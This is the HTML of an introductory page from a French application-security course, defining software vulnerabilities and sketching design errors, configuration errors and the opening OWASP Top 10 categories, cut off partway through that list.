<!doctype html><html lang=fr-fr><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><link rel=preload as=font href=https://securite-applicative.dufau.re/fonts/vendor/jost/jost-v4-latin-regular.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=https://securite-applicative.dufau.re/fonts/vendor/jost/jost-v4-latin-500.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=https://securite-applicative.dufau.re/fonts/vendor/jost/jost-v4-latin-700.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=https://securite-applicative.dufau.re/fonts/KaTeX_Main-Regular.woff2 type=font/woff2 crossorigin><link rel=preload as=font href=https://securite-applicative.dufau.re/fonts/KaTeX_Math-Italic.woff2 type=font/woff2 crossorigin><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><link rel=stylesheet href=https://securite-applicative.dufau.re/main.0fe80c6b892b5b4a23c1976293e62f35444473be7ab2a9d0d6c743d298714e2a8ee5f1852906bd82d55e7a170852cf37ae8d96a46683034d7aea1341500a89b4.css integrity="sha512-D+gMa4krW0ojwZdik+YvNUREc756sqnQ1sdD0phxTiqO5fGFKQa9gtVeehcIUs83ro2WpGaDA0166hNBUAqJtA==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><meta name=robots content="index, follow"><meta name=googlebot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><meta name=bingbot content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1"><title>Qu'est ce qu'une faille applicative ? - Formation sécurité applicative</title><meta name=description content="Demandons l&amp;rsquo;avis à Wikipedia :   Une vulnérabilité ou faille est une faiblesse dans un système informatique permettant à un attaquant de porter atteinte à l&amp;rsquo;intégrité de ce système, c&amp;rsquo;est-à-dire à son fonctionnement normal, à la confidentialité ou à l&amp;rsquo;intégrité des données qu&amp;rsquo;il contient
  Un avis ChatGpt ?   Une faille applicative est une vulnérabilité dans une application informatique qui permet à un attaquant d&amp;rsquo;exploiter une faiblesse dans le code ou la configuration de l&amp;rsquo;application pour obtenir un accès non autorisé, modifier des données ou exécuter des actions malveillantes."><link rel=canonical href=https://securite-applicative.dufau.re/docs/failles/intro/><meta property="og:locale" content="en_US"><meta property="og:type" content="article"><meta property="og:title" content="Qu'est ce qu'une faille applicative ?"><meta property="og:description" content="Demandons l&rsquo;avis à Wikipedia :   Une vulnérabilité ou faille est une faiblesse dans un système informatique permettant à un attaquant de porter atteinte à l&rsquo;intégrité de ce système, c&rsquo;est-à-dire à son fonctionnement normal, à la confidentialité ou à l&rsquo;intégrité des données qu&rsquo;il contient
  Un avis ChatGpt ?   Une faille applicative est une vulnérabilité dans une application informatique qui permet à un attaquant d&rsquo;exploiter une faiblesse dans le code ou la configuration de l&rsquo;application pour obtenir un accès non autorisé, modifier des données ou exécuter des actions malveillantes."><meta property="og:url" content="https://securite-applicative.dufau.re/docs/failles/intro/"><meta property="og:site_name" content="Formation sécurité applicative"><meta property="og:image" content="https://securite-applicative.dufau.re/doks.png"><meta property="og:image:alt" content="Formation sécurité applicative"><meta name=twitter:card content="summary_large_image"><meta name=twitter:site content="@getdoks"><meta name=twitter:creator content="@henkverlinde"><meta name=twitter:title content="Qu'est ce qu'une faille applicative ?"><meta name=twitter:description content><meta name=twitter:image content="https://securite-applicative.dufau.re/doks.png"><meta name=twitter:image:alt content="Qu'est ce qu'une faille applicative ?"><script type=application/ld+json>{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://securite-applicative.dufau.re/#/schema/organization/1","name":"Doks","url":"https://securite-applicative.dufau.re/","sameAs":["https://twitter.com/getdoks","https://github.com/h-enk/doks"],"logo":{"@type":"ImageObject","@id":"https://securite-applicative.dufau.re/#/schema/image/1","url":"https://securite-applicative.dufau.re/logo-doks.png","width":512,"height":512,"caption":"Doks"},"image":{"@id":"https://securite-applicative.dufau.re/#/schema/image/1"}},{"@type":"WebSite","@id":"https://securite-applicative.dufau.re/#/schema/website/1","url":"https://securite-applicative.dufau.re/","name":"Formation sécurité applicative","description":"Doks is a Hugo theme for building secure, fast, and SEO-ready documentation websites, which you can easily update and customize.","publisher":{"@id":"https://securite-applicative.dufau.re/#/schema/organization/1"}},{"@type":"WebPage","@id":"https://securite-applicative.dufau.re/docs/failles/intro/","url":"https://securite-applicative.dufau.re/docs/failles/intro/","name":"Qu\u0027est ce qu\u0027une faille applicative ?","description":"","isPartOf":{"@id":"https://securite-applicative.dufau.re/#/schema/website/1"},"about":{"@id":"https://securite-applicative.dufau.re/#/schema/organization/1"},"datePublished":"0001-01-01T00:00:00CET","dateModified":"0001-01-01T00:00:00CET","breadcrumb":{"@id":"https://securite-applicative.dufau.re/docs/failles/intro/#/schema/breadcrumb/1"},"primaryImageOfPage":{"@id":"https://securite-applicative.dufau.re/docs/failles/intro/#/schema/image/2"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://securite-applicative.dufau.re/docs/failles/intro/"]}]},{"@type":"BreadcrumbList","@id":"https://securite-applicative.dufau.re/docs/failles/intro/#/schema/breadcrumb/1","name":"Breadcrumbs","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://securite-applicative.dufau.re/","url":"https://securite-applicative.dufau.re/","name":"Home"}},{"@type":"ListItem","position":2,"item":{"@type":"WebPage","@id":"https://securite-applicative.dufau.re/docs/","url":"https://securite-applicative.dufau.re/docs/","name":"Docs"}},{"@type":"ListItem","position":3,"item":{"@type":"WebPage","@id":"https://securite-applicative.dufau.re/docs/failles/","url":"https://securite-applicative.dufau.re/docs/failles/","name":"Failles"}},{"@type":"ListItem","position":4,"item":{"@id":"https://securite-applicative.dufau.re/docs/failles/intro/"}}]},{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://securite-applicative.dufau.re/#/schema/article/1","headline":"Qu\u0027est ce qu\u0027une faille applicative ?","description":"","isPartOf":{"@id":"https://securite-applicative.dufau.re/docs/failles/intro/"},"mainEntityOfPage":{"@id":"https://securite-applicative.dufau.re/docs/failles/intro/"},"datePublished":"0001-01-01T00:00:00CET","dateModified":"0001-01-01T00:00:00CET","author":{"@id":"https://securite-applicative.dufau.re/#/schema/person/2"},"publisher":{"@id":"https://securite-applicative.dufau.re/#/schema/organization/1"},"image":{"@id":"https://securite-applicative.dufau.re/docs/failles/intro/#/schema/image/2"}}]},{"@context":"https://schema.org","@graph":[{"@type":"Person","@id":"https://securite-applicative.dufau.re/#/schema/person/2","name":"Henk Verlinde","sameAs":["https://twitter.com/henkverlinde","https://www.linkedin.com/in/henkverlinde/","https://github.com/h-enk"]}]},{"@context":"https://schema.org","@graph":[{"@type":"ImageObject","@id":"https://securite-applicative.dufau.re/docs/failles/intro/#/schema/image/2","url":"https://securite-applicative.dufau.re/doks.png","contentUrl":"https://securite-applicative.dufau.re/doks.png","caption":"Qu\u0027est ce qu\u0027une faille applicative ?"}]}]}</script><meta name=theme-color content="#fff"><link rel=apple-touch-icon sizes=180x180 href=https://securite-applicative.dufau.re/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=https://securite-applicative.dufau.re/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=https://securite-applicative.dufau.re/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=https://securite-applicative.dufau.re/site.webmanifest></head><body class="docs single"><div class=header-bar></div><header class="navbar navbar-expand-md navbar-light doks-navbar"><nav class="container-xxl flex-wrap flex-md-nowrap" aria-label="Main navigation"><a class="navbar-brand p-0 me-auto" href=/ aria-label="Formation sécurité applicative">Formation sécurité applicative</a>
<button class="btn btn-menu d-block d-md-none order-5" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasDoks aria-controls=offcanvasDoks aria-label="Open main menu"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button><div class="offcanvas offcanvas-end border-0 py-md-1" tabindex=-1 id=offcanvasDoks data-bs-backdrop=true aria-labelledby=offcanvasDoksLabel><div class="header-bar d-md-none"></div><div class="offcanvas-header d-md-none"><h2 class="h5 offcanvas-title ps-2" id=offcanvasDoksLabel><a class=text-dark href=/>Formation sécurité applicative</a></h2><button type=button class="btn-close text-reset me-2" data-bs-dismiss=offcanvas aria-label="Close main menu"></button></div><div class="offcanvas-body px-4"><h3 class="h6 text-uppercase mb-3 d-md-none">Main</h3><ul class="nav flex-column flex-md-row ms-md-n3"></ul><hr class="text-black-50 my-4 d-md-none"><h3 class="h6 text-uppercase mb-3 d-md-none">Socials</h3><ul class="nav flex-column flex-md-row ms-md-auto me-md-n5 pe-md-2"><li class=nav-item><a class="nav-link ps-0 py-1" href=https://github.com/clement-dufaure/securite-applicative><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-github"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg><small class="ms-2 d-md-none">GitHub</small></a></li></ul></div></div><button id=mode class="btn btn-link order-md-1" type=button aria-label="Toggle user interface mode">
<span class=toggle-dark><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-moon"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg></span><span class=toggle-light><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-sun"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></span></button></nav></header><nav class="doks-subnavbar py-2 sticky-lg-top" aria-label="Secondary navigation"><div class="container-xxl d-flex align-items-md-center"><form class="doks-search position-relative flex-grow-1 me-auto"><input id=search class="form-control is-search" type=search placeholder="Search docs..." aria-label="Search docs..." autocomplete=off><div id=suggestions class="shadow bg-white rounded d-none"></div></form><button class="btn doks-sidebar-toggle d-lg-none ms-3 order-3 collapsed" type=button data-bs-toggle=collapse data-bs-target=#doks-docs-nav aria-controls=doks-docs-nav aria-expanded=false aria-label="Toggle documentation navigation"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="doks doks-expand" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>Expand</title><polyline points="7 13 12 18 17 13"/><polyline points="7 6 12 11 17 6"/></svg><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="doks doks-collapse" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>Collapse</title><polyline points="17 11 12 6 7 11"/><polyline points="17 18 12 13 7 18"/></svg></button></div></nav><div class=container-xxl><aside class=doks-sidebar><nav id=doks-docs-nav class="collapse d-lg-none" aria-label="Tertiary navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-0b79795d3efc95b9976c7c5b933afce2 aria-expanded=false>
Introduction</button><div class=collapse id=section-0b79795d3efc95b9976c7c5b933afce2><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/intro/grands-principes/>Les grands principes de la sécurité</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-53c7b2c8457704ee6f16cb2e6434b744 aria-expanded=true>
Failles applicatives</button><div class="collapse show" id=section-53c7b2c8457704ee6f16cb2e6434b744><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded active" href=https://securite-applicative.dufau.re/docs/failles/intro/>Qu'est ce qu'une faille applicative ?</a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/failles/sql/>Injections de code (serveur)</a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/failles/injection-client/>Injections de code (client)</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-2badb7fa3e862298a650909d45c5066b aria-expanded=false>
Https</button><div class=collapse id=section-2badb7fa3e862298a650909d45c5066b><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/https/fonctionnement/>Fontionnement de https</a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/https/pratique/>Mise en pratique de https</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-c48fb18ab9d562b42911cddcdc0c855f aria-expanded=false>
Authentification</button><div class=collapse id=section-c48fb18ab9d562b42911cddcdc0c855f><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/principes/>Les grands principes de l'authentification</a></li></ul></div></li></ul></nav></aside></div><div class="wrap container-xxl" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar d-none d-lg-block"><nav class=docs-links aria-label="Main navigation"><ul class="list-unstyled collapsible-sidebar"><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-0b79795d3efc95b9976c7c5b933afce2 aria-expanded=false>
Introduction</button><div class=collapse id=section-0b79795d3efc95b9976c7c5b933afce2><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/intro/grands-principes/>Les grands principes de la sécurité</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-53c7b2c8457704ee6f16cb2e6434b744 aria-expanded=true>
Failles applicatives</button><div class="collapse show" id=section-53c7b2c8457704ee6f16cb2e6434b744><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded active" href=https://securite-applicative.dufau.re/docs/failles/intro/>Qu'est ce qu'une faille applicative ?</a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/failles/sql/>Injections de code (serveur)</a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/failles/injection-client/>Injections de code (client)</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-2badb7fa3e862298a650909d45c5066b aria-expanded=false>
Https</button><div class=collapse id=section-2badb7fa3e862298a650909d45c5066b><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/https/fonctionnement/>Fontionnement de https</a></li><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/https/pratique/>Mise en pratique de https</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-c48fb18ab9d562b42911cddcdc0c855f aria-expanded=false>
Authentification</button><div class=collapse id=section-c48fb18ab9d562b42911cddcdc0c855f><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li><a class="docs-link rounded" href=https://securite-applicative.dufau.re/docs/authentification/principes/>Les grands principes de l'authentification</a></li></ul></div></li></ul></nav></div><nav class="docs-toc d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=TableOfContents><ul><li><a href=#une-erreur-de-conception->Une erreur de conception ?</a></li><li><a href=#une-erreur-de-configuration->Une erreur de configuration ?</a></li><li><a href=#une-erreur-de-programmation->Une erreur de programmation ?</a><ul><li><a href=#les-vulnérabilités-concrètement->Les vulnérabilités concrètement !</a></li><li><a href=#linjection-de-code>L&rsquo;injection de code</a></li><li><a href=#linjection-de-code-1>L&rsquo;injection de code</a></li><li><a href=#linjection-de-code-2>L&rsquo;injection de code</a></li><li><a href=#linjection-de-code-côté-serveur--sql-ou-ldap>L&rsquo;injection de code &ldquo;côté serveur&rdquo; : SQL ou LDAP</a></li><li><a href=#linjection-de-code--côté-serveur>L&rsquo;injection de code &ldquo;côté serveur&rdquo;</a></li><li><a href=#linjection-de-code--côté-serveur-1>L&rsquo;injection de code &ldquo;côté serveur&rdquo;</a></li><li><a href=#linjection-de-code-côté-serveur--sql-ou-ldap-1>L&rsquo;injection de code &ldquo;côté serveur&rdquo; : SQL ou LDAP</a></li></ul></li></ul><ul><li><ul><li><a href=#les-iframe>Les <code>&lt;iframe></code></a></li><li><a href=#xfs>XFS</a></li><li><a href=#linjection-de-code-côté-client->L&rsquo;injection de code&mldr; côté client !</a></li><li><a href=#linjection-de-code-côté-client--1>L&rsquo;injection de code&mldr; côté client !</a></li><li><a href=#linjection-de-code-côté-client--2>L&rsquo;injection de code&mldr; côté client !</a></li><li><a href=#linjection-de-code-côté-client>L&rsquo;injection de code &ldquo;côté client&rdquo;</a></li><li><a href=#linjection-de-code-côté-client-1>L&rsquo;injection de code &ldquo;côté client&rdquo;</a></li></ul></li><li><a href=#linjection-de-code-côté-client--xss-cross-site-scripting>L&rsquo;injection de code &ldquo;côté client&rdquo; : XSS (Cross-Site Scripting)</a><ul><li><a href=#pourquoi->Pourquoi ?</a></li><li><a href=#comment->Comment ?</a></li><li><a href=#types-de-xss>Types de XSS</a></li></ul></li><li><a href=#sécurité->Sécurité :</a></li><li><a href=#sécurité-déclarative->Sécurité déclarative :</a></li><li><a href=#compléments-pour-la-protection-des-cookies>Compléments pour la protection des cookies</a></li></ul><ul><li><ul><li><a href=#avant-de-continuer>Avant de continuer&mldr;</a></li><li><a href=#linjection-de-code--le-retour-de-la-revanche>L&rsquo;injection de code : le retour de la revanche</a></li><li><a href=#linjection-de-code--le-retour-de-la-revanche-1>L&rsquo;injection de code : le retour de la revanche</a></li><li><a href=#linjection-de-code-côté-serveur>L&rsquo;injection de code &ldquo;côté serveur&rdquo;</a></li></ul></li><li><a href=#sécurité--1>Sécurité :</a></li><li><a href=#sécurité--2>Sécurité :</a><ul><li><a href=#linjection-de-code--synthèse>L&rsquo;injection de code : Synthèse</a></li><li><a href=#linjection-de-code-3>L&rsquo;injection de code</a></li><li><a href=#linjection-de-code-4>L&rsquo;injection de code</a></li><li><a href=#les-attaques-basées-sur-des-échanges-entre-domaines--encore-une->Les attaques basées sur des échanges entre domaines : encore une !!</a></li><li><a href=#démo-csrf>Démo CSRF</a></li><li><a href=#protections>Protections</a></li><li><a href=#protections-1>Protections</a></li><li><a href=#protections-2>Protections</a></li><li><a href=#protections-3>Protections</a></li><li><a href=#protections-4>Protections</a></li><li><a href=#csrf-et-applis-modernes>CSRF et applis &ldquo;modernes&rdquo;</a></li><li><a href=#la-protection-cors>La protection CORS</a></li><li><a href=#la-protection-cors-1>La protection CORS</a></li><li><a href=#la-protection-cors-2>La protection CORS</a></li><li><a href=#la-protection-cors-3>La protection CORS</a></li><li><a href=#scénario-cors>Scénario CORS</a></li><li><a href=#scénario-cors-1>Scénario CORS</a></li><li><a href=#scénario-cors-2>Scénario CORS</a></li><li><a href=#scénario-cors-3>Scénario CORS</a></li><li><a href=#la-protection-cors-4>La protection CORS</a></li><li><a href=#la-protection-cors-5>La protection CORS</a></li><li><a href=#synthèse>Synthèse</a></li><li><a href=#sinitier-aux-failles-applicatives>S&rsquo;initier aux failles applicatives</a></li><li><a href=#surveiller-les-dépendances-obsolètes>Surveiller les dépendances obsolètes</a></li><li><a href=#le-code-des-autres>&ldquo;Le code des autres&rdquo;</a></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9 mx-xl-auto"><h1>Qu'est ce qu'une faille applicative ?</h1><p class=lead></p><nav class=d-xl-none aria-label="Quaternary navigation"><div class=page-links><h3>On this page</h3><nav id=TableOfContents><ul><li><a href=#une-erreur-de-conception->Une erreur de conception ?</a></li><li><a href=#une-erreur-de-configuration->Une erreur de configuration ?</a></li><li><a href=#une-erreur-de-programmation->Une erreur de programmation ?</a><ul><li><a href=#les-vulnérabilités-concrètement->Les vulnérabilités concrètement !</a></li><li><a href=#linjection-de-code>L&rsquo;injection de code</a></li><li><a href=#linjection-de-code-1>L&rsquo;injection de code</a></li><li><a href=#linjection-de-code-2>L&rsquo;injection de code</a></li><li><a href=#linjection-de-code-côté-serveur--sql-ou-ldap>L&rsquo;injection de code &ldquo;côté serveur&rdquo; : SQL ou LDAP</a></li><li><a href=#linjection-de-code--côté-serveur>L&rsquo;injection de code &ldquo;côté serveur&rdquo;</a></li><li><a href=#linjection-de-code--côté-serveur-1>L&rsquo;injection de code &ldquo;côté serveur&rdquo;</a></li><li><a href=#linjection-de-code-côté-serveur--sql-ou-ldap-1>L&rsquo;injection de code &ldquo;côté serveur&rdquo; : SQL ou LDAP</a></li></ul></li></ul><ul><li><ul><li><a href=#les-iframe>Les <code>&lt;iframe></code></a></li><li><a href=#xfs>XFS</a></li><li><a href=#linjection-de-code-côté-client->L&rsquo;injection de code&mldr; côté client !</a></li><li><a href=#linjection-de-code-côté-client--1>L&rsquo;injection de code&mldr; côté client !</a></li><li><a href=#linjection-de-code-côté-client--2>L&rsquo;injection de code&mldr; côté client !</a></li><li><a href=#linjection-de-code-côté-client>L&rsquo;injection de code &ldquo;côté client&rdquo;</a></li><li><a href=#linjection-de-code-côté-client-1>L&rsquo;injection de code &ldquo;côté client&rdquo;</a></li></ul></li><li><a href=#linjection-de-code-côté-client--xss-cross-site-scripting>L&rsquo;injection de code &ldquo;côté client&rdquo; : XSS (Cross-Site Scripting)</a><ul><li><a href=#pourquoi->Pourquoi ?</a></li><li><a href=#comment->Comment ?</a></li><li><a href=#types-de-xss>Types de XSS</a></li></ul></li><li><a href=#sécurité->Sécurité :</a></li><li><a href=#sécurité-déclarative->Sécurité déclarative :</a></li><li><a href=#compléments-pour-la-protection-des-cookies>Compléments pour la protection des cookies</a></li></ul><ul><li><ul><li><a href=#avant-de-continuer>Avant de continuer&mldr;</a></li><li><a href=#linjection-de-code--le-retour-de-la-revanche>L&rsquo;injection de code : le retour de la revanche</a></li><li><a href=#linjection-de-code--le-retour-de-la-revanche-1>L&rsquo;injection de code : le retour de la revanche</a></li><li><a href=#linjection-de-code-côté-serveur>L&rsquo;injection de code &ldquo;côté serveur&rdquo;</a></li></ul></li><li><a href=#sécurité--1>Sécurité :</a></li><li><a href=#sécurité--2>Sécurité :</a><ul><li><a href=#linjection-de-code--synthèse>L&rsquo;injection de code : Synthèse</a></li><li><a href=#linjection-de-code-3>L&rsquo;injection de code</a></li><li><a href=#linjection-de-code-4>L&rsquo;injection de code</a></li><li><a href=#les-attaques-basées-sur-des-échanges-entre-domaines--encore-une->Les attaques basées sur des échanges entre domaines : encore une !!</a></li><li><a href=#démo-csrf>Démo CSRF</a></li><li><a href=#protections>Protections</a></li><li><a href=#protections-1>Protections</a></li><li><a href=#protections-2>Protections</a></li><li><a href=#protections-3>Protections</a></li><li><a href=#protections-4>Protections</a></li><li><a href=#csrf-et-applis-modernes>CSRF et applis &ldquo;modernes&rdquo;</a></li><li><a href=#la-protection-cors>La protection CORS</a></li><li><a href=#la-protection-cors-1>La protection CORS</a></li><li><a href=#la-protection-cors-2>La protection CORS</a></li><li><a href=#la-protection-cors-3>La protection CORS</a></li><li><a href=#scénario-cors>Scénario CORS</a></li><li><a href=#scénario-cors-1>Scénario CORS</a></li><li><a href=#scénario-cors-2>Scénario CORS</a></li><li><a href=#scénario-cors-3>Scénario CORS</a></li><li><a href=#la-protection-cors-4>La protection CORS</a></li><li><a href=#la-protection-cors-5>La protection CORS</a></li><li><a href=#synthèse>Synthèse</a></li><li><a href=#sinitier-aux-failles-applicatives>S&rsquo;initier aux failles applicatives</a></li><li><a href=#surveiller-les-dépendances-obsolètes>Surveiller les dépendances obsolètes</a></li><li><a href=#le-code-des-autres>&ldquo;Le code des autres&rdquo;</a></li></ul></li></ul></nav></div></nav><ul><li>Demandons l&rsquo;avis à <strong><a href=https://fr.wikipedia.org/wiki/Vuln%C3%A9rabilit%C3%A9_(informatique)>Wikipedia</a></strong> :</li></ul><blockquote><p><em>Une vulnérabilité ou faille est une faiblesse dans un système informatique permettant à un attaquant de porter atteinte à l&rsquo;intégrité de ce système, c&rsquo;est-à-dire à son fonctionnement normal, à la confidentialité ou à l&rsquo;intégrité des données qu&rsquo;il contient</em></p></blockquote><ul><li>Un avis ChatGpt ?</li></ul><blockquote><p>Une faille applicative est une vulnérabilité dans une application informatique qui permet à un attaquant d&rsquo;exploiter une faiblesse dans le code ou la configuration de l&rsquo;application pour obtenir un accès non autorisé, modifier des données ou exécuter des actions malveillantes.</p></blockquote><blockquote><p>Les failles applicatives peuvent être causées par une mauvaise conception de l&rsquo;application, des erreurs de programmation, des problèmes de configuration ou des erreurs humaines. Certaines des vulnérabilités les plus courantes comprennent les injections SQL, les attaques de scripts entre sites (XSS), les attaques de falsification de demande intersite (CSRF), les failles d&rsquo;authentification, les failles de contrôle d&rsquo;accès, les erreurs de validation de données, etc.</p></blockquote><blockquote><p>Il est important pour les développeurs et les équipes de sécurité informatique de détecter et de corriger rapidement les failles applicatives pour éviter que des attaquants ne profitent de ces vulnérabilités. Les tests de sécurité réguliers, les examens de code et les audits de sécurité sont des moyens courants de détection et de correction des failles applicatives.</p></blockquote><p>Grandes catégories :</p><ul><li>Une erreur de conception ?</li><li>Une erreur de configuration ?</li><li>Une erreur de programmation (bug, fonctionnalité mal implémentée) ?</li></ul><h2 id=une-erreur-de-conception->Une erreur de conception ? <a href=#une-erreur-de-conception- class=anchor aria-hidden=true>#</a></h2><p>Cas 1 :</p><p><em>Soit une plateforme de réservation en ligne pour des chambres d&rsquo;hôtel.</em></p><p><em>Je propose aux utilisateurs d&rsquo;annuler leurs commandes jusqu&rsquo;à 16 h.</em></p><p><em>Un concurrent peut facilement pourrir mon hôtel en réservant toutes les chambres et en les annulant à 15h55.</em></p><p>Est ce que cela fait partie du <strong>fonctionnement normal</strong> ?</p><p>Cas 2 :</p><p><em>Sur mon web service de gestion d&rsquo;annuaire, on peut créer autant d&rsquo;habilitations que l&rsquo;on veut pour un contact</em></p><p>Au delà d&rsquo;environ 300 habilitations c&rsquo;est l&rsquo;annuaire qui finit par planter&mldr;</p><p>Problématiques à la conception :</p><ul><li>S&rsquo;assurer que <strong>par design</strong> certains processus ne seront pas forcément soumis à des instabilités</li><li>Connaître les limites de son système</li></ul><h2 id=une-erreur-de-configuration->Une erreur de configuration ? <a href=#une-erreur-de-configuration- class=anchor aria-hidden=true>#</a></h2><p>Quelques exemples :</p><ul><li>L&rsquo;application n&rsquo;est pas proposée et forcée en HTTPS</li><li>Flux trop large en entrée (par exemple possiblité de connexion sur ports d&rsquo;administration ou base de données exposée)</li><li>Secrets exposés</li><li>Bibliothèques à jour mais avec une configuration permettant de faire n&rsquo;importe quoi (<code>mode.debug=true</code> ou <code>conf.developpement=true</code>)</li><li>&mldr;</li></ul><h2 id=une-erreur-de-programmation->Une erreur de programmation ? <a href=#une-erreur-de-programmation- class=anchor aria-hidden=true>#</a></h2><ul><li>Son propre code</li><li>Le code des autres, dit autrement les bibliothèques utilisées : Nécéssité de mise à jour régulière !</li></ul><p><strong>Le top 10 des vulnérabilités : OWASP</strong></p><p><a href=https://owasp.org/www-project-top-ten/>https://owasp.org/www-project-top-ten/</a></p><ul><li>A1 : Acceder à une ressource non prévue :<ul><li>Mauvaise gestion des droits</li><li>En forcant un utilisateur privilégié à cliquer sur l&rsquo;action souhaitée = XSS y compris injection de code &ldquo;côté client&rdquo;</li><li>Vol de session : conséquence de XSS et d&rsquo;injection de code &ldquo;côté client&rdquo;</li></ul></li><li>A2 : Ne pas ou mal utiliser un canal chiffré<ul><li>Protocoles obsolètes, contrôles non effectués</li><li>HTTPS non obligatoire</li></ul></li></ul><hr><ul><li>A3 : Injection de code &ldquo;côté serveur&rdquo;<ul><li>Faire éxécuter du code non prévu en particulier directement sur la base de données</li></ul></li><li>A4 : Erreur de conception<ul><li>La meilleure des implémentations ne corrigera pas</li></ul></li><li>A5 : Erreur de configuration</li><li>A6 : Bibliothèques pas à jour (ou utilisation de bibliothèques abandonnées)<ul><li>Bugs des &ldquo;autres&rdquo;</li></ul></li></ul><hr><ul><li>A7 : 